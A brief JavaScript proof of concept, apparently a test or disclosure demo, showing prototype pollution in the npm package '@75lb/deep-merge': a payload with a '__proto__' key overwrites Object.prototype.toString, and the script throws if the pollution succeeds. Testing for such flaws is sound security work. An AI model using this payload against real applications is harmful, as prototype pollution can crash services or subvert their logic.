const deep_merge = require('@75lb/deep-merge');

let payload = { ["__proto__"]: { "toString": "polluted" } };

deep_merge.default({}, payload);

if (({}).toString == "polluted")
  throw Error("I pollute");
